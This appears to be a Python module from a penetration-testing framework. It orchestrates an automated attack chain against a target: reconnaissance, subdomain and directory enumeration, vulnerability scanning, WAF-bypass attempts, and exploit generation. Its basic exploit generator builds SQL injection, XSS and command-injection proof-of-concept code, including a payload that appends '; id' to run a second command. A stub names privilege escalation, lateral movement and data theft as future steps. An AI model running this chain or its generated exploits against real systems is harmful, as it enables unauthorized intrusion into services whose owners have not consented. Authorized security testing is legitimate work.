"""
security/attack_chain.py - 攻击链编排器

核心能力：
- 串联信息收集→资产发现→漏洞探测→漏洞验证→利用生成→报告生成的完整攻击链路
- 支持多种预设攻击链（Web应用链、网络服务链、代码审计链、综合链）
- 自动根据目标类型选择扫描策略
- 攻击链进度追踪和中间结果保存
- 支持断点续跑
- 与四大能力（记忆/工具/代码/大脑）深度整合
"""
import os
from pathlib import Path
from datetime import datetime, date
import re
import sys
import json
import time
import uuid
import threading
from typing import Any, Dict, List, Optional, Tuple, Callable
from dataclasses import dataclass, field, asdict, is_dataclass
from enum import Enum
from collections import defaultdict


# ================================================================
# 枚举和数据结构
# ================================================================
from .chain_phase import *  # noqa: F401,F403
from .atomic_write_json import *  # noqa: F401,F403
from .core import *  # noqa: F401,F403

class AttackChainOrchestratorPart1(object):
    def __init__(self, vuln_detector=None, waf_bypass=None, static_scanner=None,
                 asset_discovery=None, directory_bruteforcer=None, oob_detector=None,
                 exploit_generator=None, memory_system=None, tool_library=None,
                 codebase=None, agent_brain=None,
                 concurrent: int = 3, timeout: int = 10,
                 checkpoint_dir: str = None):
        self.vuln_detector = vuln_detector
        self.waf_bypass = waf_bypass
        self.static_scanner = static_scanner
        self.asset_discovery = asset_discovery
        self.directory_bruteforcer = directory_bruteforcer
        self.oob_detector = oob_detector
        self.exploit_generator = exploit_generator
        self.memory_system = memory_system
        self.tool_library = tool_library
        self.codebase = codebase
        self.agent_brain = agent_brain
        self.concurrent = concurrent
        self.timeout = timeout
        # 原来默认是相对路径 "checkpoints"，会跟着启动目录到处新建，
        # 用户根本不知道它是谁建的。改为放在统一数据目录下。
        if not checkpoint_dir:
            try:
                from libertas.foundation.config import get_data_dir
                checkpoint_dir = os.path.join(get_data_dir(), 'checkpoints')
            except Exception:
                checkpoint_dir = os.path.join(os.path.expanduser('~'), 'MrHuaData', 'checkpoints')
        self.checkpoint_dir = checkpoint_dir
        self.chain_history: List[AttackChainResult] = []
        self._lock = threading.RLock()
        self._cancelled = False
    def run_chain(self, target: str, template: str = "auto",
                  custom_config: Dict = None) -> AttackChainResult:
        """执行攻击链

        Args:
            target: 目标（URL/IP/域名/代码路径）
            template: 攻击链模板（auto/web/network/code/quick/full）
            custom_config: 自定义配置覆盖
        """
        self._cancelled = False
        attack_target = AttackTarget(target=target)

        # 自动选择模板
        if template == "auto":
            template = self._auto_select_template(attack_target)

        chain_config = AttackChainTemplates.get_template(template)
        if not chain_config:
            chain_config = AttackChainTemplates.quick_scan_chain()

        if custom_config:
            chain_config.update(custom_config)

        result = AttackChainResult(
            chain_name=chain_config.get("name", "自定义攻击链"),
            target=attack_target,
            config=chain_config,
        )
        result.status = ChainStatus.RUNNING

        phases_to_run = chain_config.get("phases", [])

        try:
            for phase in phases_to_run:
                if self._cancelled:
                    result.status = ChainStatus.CANCELLED
                    break

                phase_result = result.get_phase(phase)
                phase_result.start()

                try:
                    phase_output = self._execute_phase(phase, attack_target, chain_config, result)
                    phase_result.complete(
                        findings=phase_output.get("findings", []),
                        output_data=phase_output.get("output", {}),
                    )

                    # 收集漏洞
                    for vuln in phase_output.get("vulnerabilities", []):
                        result.add_vulnerability(vuln)
                    for finding in phase_output.get("findings", []):
                        result.add_finding(finding)

                    # 保存检查点
                    self._save_checkpoint(result)

                    # 记忆系统保存
                    self._save_to_memory(phase, phase_output, attack_target)

                except Exception as e:
                    phase_result.fail(str(e))
                    result.errors.append(f"阶段{phase.value}失败: {e}")
                    # 关键阶段失败则终止
                    if phase in (ChainPhase.VULN_SCAN, ChainPhase.RECON):
                        break

            if not self._cancelled:
                result.status = ChainStatus.COMPLETED

        except Exception as e:
            result.status = ChainStatus.FAILED
            result.errors.append(f"攻击链执行失败: {e}")

        result.completed_at = time.time()
        result.duration_seconds = result.completed_at - result.started_at

        with self._lock:
            self.chain_history.append(result)

        return result
    def _execute_phase(self, phase: ChainPhase, target: AttackTarget,
                       config: Dict, chain_result: AttackChainResult) -> Dict:
        """执行单个阶段"""
        output = {"findings": [], "vulnerabilities": [], "output": {}}

        if phase == ChainPhase.RECON:
            output = self._phase_recon(target, config)
        elif phase == ChainPhase.ASSET_DISCOVERY:
            output = self._phase_asset_discovery(target, config)
        elif phase == ChainPhase.VULN_SCAN:
            output = self._phase_vuln_scan(target, config, chain_result)
        elif phase == ChainPhase.VULN_VERIFY:
            output = self._phase_vuln_verify(target, config, chain_result)
        elif phase == ChainPhase.EXPLOIT_GENERATE:
            output = self._phase_exploit_generate(target, config, chain_result)
        elif phase == ChainPhase.POST_EXPLOIT:
            output = self._phase_post_exploit(target, config, chain_result)
        elif phase == ChainPhase.REPORT:
            output = self._phase_report(target, config, chain_result)

        return output
    def _phase_recon(self, target: AttackTarget, config: Dict) -> Dict:
        """信息收集阶段"""
        findings = []
        output = {}

        # DNS解析
        if target.domain:
            try:
                import socket
                ips = socket.getaddrinfo(target.domain, None)
                ip_list = list(set(ip[4][0] for ip in ips))
                findings.append({"type": "dns_resolution", "domain": target.domain, "ips": ip_list})
                output["dns_ips"] = ip_list
            except Exception as e:
                findings.append({"type": "dns_error", "error": str(e)})

        # WHOIS查询（如果有工具库）
        if self.tool_library:
            try:
                whois_result = self.tool_library.execute_tool("whois_lookup", {"domain": target.domain})
                if whois_result.get("success"):
                    findings.append({"type": "whois", "data": whois_result.get("result", {})})
            except Exception:
                pass

        # 基础HTTP信息
        if target.url:
            try:
                import urllib.request
                req = urllib.request.Request(target.url, method="GET")
                req.add_header("User-Agent", "Mozilla/5.0")
                resp = urllib.request.urlopen(req, timeout=self.timeout)
                headers = dict(resp.headers)
                findings.append({
                    "type": "http_info",
                    "status": resp.getcode(),
                    "server": headers.get("Server", ""),
                    "x_powered_by": headers.get("X-Powered-By", ""),
                    "content_type": headers.get("Content-Type", ""),
                    "headers": headers,
                })
                output["http_headers"] = headers
            except Exception as e:
                findings.append({"type": "http_error", "error": str(e)})

        return {"findings": findings, "vulnerabilities": [], "output": output}
    def _phase_asset_discovery(self, target: AttackTarget, config: Dict) -> Dict:
        """资产发现阶段"""
        findings = []
        output = {}

        if self.asset_discovery and target.domain:
            try:
                subdomains = self.asset_discovery.enumerate_subdomains(target.domain)
                findings.append({"type": "subdomains", "count": len(subdomains), "subdomains": subdomains[:50]})
                output["subdomains"] = subdomains
            except Exception as e:
                findings.append({"type": "asset_discovery_error", "error": str(e)})

        # 目录爆破
        if self.directory_bruteforcer and target.url:
            try:
                dirs = self.directory_bruteforcer.bruteforce(target.url)
                findings.append({"type": "directories", "count": len(dirs), "directories": dirs[:50]})
                output["directories"] = dirs
            except Exception as e:
                findings.append({"type": "directory_bruteforce_error", "error": str(e)})

        return {"findings": findings, "vulnerabilities": [], "output": output}
    def _phase_vuln_scan(self, target: AttackTarget, config: Dict,
                          chain_result: AttackChainResult) -> Dict:
        """漏洞扫描阶段"""
        vulnerabilities = []
        findings = []
        output = {}

        vuln_types = config.get("vuln_types", "all")
        if vuln_types == "all":
            vuln_types = None
        deep_scan = config.get("deep_scan", False)

        # Web漏洞扫描
        if self.vuln_detector and target.url:
            try:
                scan_result = self.vuln_detector.scan_url(
                    url=target.url,
                    vuln_types=vuln_types,
                    deep=deep_scan,
                )
                for vuln in scan_result.vulnerabilities:
                    vulnerabilities.append(vuln.to_dict())
                findings.append({
                    "type": "web_vuln_scan",
                    "total": scan_result.total_requests,
                    "injection_points": scan_result.total_injection_points,
                    "found": len(scan_result.vulnerabilities),
                })
                output["web_scan_result"] = scan_result.get_summary()
            except Exception as e:
                findings.append({"type": "web_vuln_scan_error", "error": str(e)})

        # 静态代码扫描
        if self.static_scanner and target.source_path:
            try:
                static_result = self.static_scanner.scan_project(
                    target.source_path,
                    languages=config.get("languages"),
                )
                for vuln in static_result.vulnerabilities:
                    vulnerabilities.append(vuln.to_dict())
                findings.append({
                    "type": "static_code_scan",
                    "files_scanned": static_result.total_files_scanned,
                    "found": len(static_result.vulnerabilities),
                })
                output["static_scan_result"] = static_result.get_summary()
            except Exception as e:
                findings.append({"type": "static_scan_error", "error": str(e)})

        return {"findings": findings, "vulnerabilities": vulnerabilities, "output": output}
    def _phase_vuln_verify(self, target: AttackTarget, config: Dict,
                            chain_result: AttackChainResult) -> Dict:
        """漏洞验证阶段"""
        findings = []
        verified_vulns = []
        output = {}

        # 从扫描结果中获取待验证漏洞
        pending_vulns = [v for v in chain_result.all_vulnerabilities
                        if v.get("confidence") != "confirmed" and not v.get("false_positive")]

        findings.append({"type": "verify_summary", "pending": len(pending_vulns)})

        # WAF绕过测试（对被拦截的payload）
        if self.waf_bypass and target.url:
            blocked_payloads = [v for v in pending_vulns if v.get("vuln_type") in
                               ["sql_injection", "xss", "command_injection"]]
            if blocked_payloads:
                try:
                    for vuln in blocked_payloads[:5]:  # 最多验证5个
                        payload = vuln.get("payload", "")
                        param = vuln.get("injection_point", {}).get("name", "")
                        if payload and param:
                            bypass_result = self.waf_bypass.bypass(
                                url=target.url,
                                payload=payload,
                                parameter=param,
                                location=vuln.get("injection_point", {}).get("location", "url_param"),
                            )
                            if bypass_result.bypassed:
                                vuln["waf_bypassed"] = True
                                vuln["bypass_technique"] = bypass_result.best_technique
                                vuln["confidence"] = "confirmed"
                                verified_vulns.append(vuln)
                                findings.append({
                                    "type": "waf_bypass_success",
                                    "vuln": vuln.get("vuln_type"),
                                    "technique": bypass_result.best_technique,
                                })
                except Exception as e:
                    findings.append({"type": "waf_bypass_error", "error": str(e)})

        output["verified_count"] = len(verified_vulns)
        return {"findings": findings, "vulnerabilities": verified_vulns, "output": output}
    def _phase_exploit_generate(self, target: AttackTarget, config: Dict,
                                 chain_result: AttackChainResult) -> Dict:
        """利用代码生成阶段"""
        findings = []
        output = {}
        exploits = []

        if not config.get("generate_exploits", True):
            return {"findings": [{"type": "exploit_generation_skipped"}], "vulnerabilities": [], "output": {}}

        confirmed_vulns = [v for v in chain_result.all_vulnerabilities
                           if v.get("confidence") == "confirmed" or v.get("verified")]

        if self.exploit_generator:
            for vuln in confirmed_vulns[:10]:  # 最多生成10个
                try:
                    exploit = self.exploit_generator.generate(vuln)
                    if exploit:
                        exploits.append(exploit)
                        findings.append({
                            "type": "exploit_generated",
                            "vuln_type": vuln.get("vuln_type"),
                            "exploit_type": exploit.get("type"),
                        })
                except Exception as e:
                    findings.append({"type": "exploit_generate_error", "error": str(e)})
        else:
            # 基础利用代码生成（无专用生成器时）
            for vuln in confirmed_vulns[:5]:
                exploit = self._basic_exploit_generator(vuln, target)
                if exploit:
                    exploits.append(exploit)

        output["exploits"] = exploits
        output["exploit_count"] = len(exploits)
        return {"findings": findings, "vulnerabilities": [], "output": output}
    def _basic_exploit_generator(self, vuln: Dict, target: AttackTarget) -> Optional[Dict]:
        """基础利用代码生成"""
        vuln_type = vuln.get("vuln_type", "")
        payload = vuln.get("payload", "")
        param = vuln.get("injection_point", {}).get("name", "")

        if not target.url or not param:
            return None

        if vuln_type == "sql_injection":
            code = f'''import requests
url = "{target.url}"
params = {{"{param}": "{payload}"}}
response = requests.get(url, params=params)
print(response.text)
'''
            return {"type": "sql_injection_poc", "language": "python", "code": code, "vuln": vuln}

        elif vuln_type == "xss":
            code = f'''# XSS PoC: 在浏览器中访问以下URL
# {target.url}?{param}={payload}
# 弹窗即表示漏洞存在
'''
            return {"type": "xss_poc", "language": "text", "code": code, "vuln": vuln}

        elif vuln_type == "command_injection":
            code = f'''import requests
url = "{target.url}"
params = {{"{param}": "{payload}; id"}}
response = requests.get(url, params=params)
print(response.text)
'''
            return {"type": "command_injection_poc", "language": "python", "code": code, "vuln": vuln}

        return None
    def _phase_post_exploit(self, target: AttackTarget, config: Dict,
                             chain_result: AttackChainResult) -> Dict:
        """后渗透阶段（基础版）"""
        findings = [{"type": "post_exploit", "status": "not_implemented",
                     "message": "后渗透能力待扩展（权限提升/横向移动/数据窃取）"}]
        return {"findings": findings, "vulnerabilities": [], "output": {}}
